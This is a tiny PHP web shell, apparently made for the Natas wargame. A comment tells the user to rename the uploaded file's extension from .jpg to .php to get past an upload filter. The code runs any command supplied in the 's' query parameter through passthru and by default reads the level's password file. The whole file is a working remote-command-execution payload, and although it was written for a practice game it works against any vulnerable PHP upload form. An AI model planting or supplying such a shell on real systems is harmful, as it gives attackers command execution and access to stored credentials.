<?php
/*
change the filename extension first in the form input (.jpg to .php)
*/
echo '<pre>';
passthru(@$_GET['s'] ?: "cat /etc/natas_webpass/natas13");
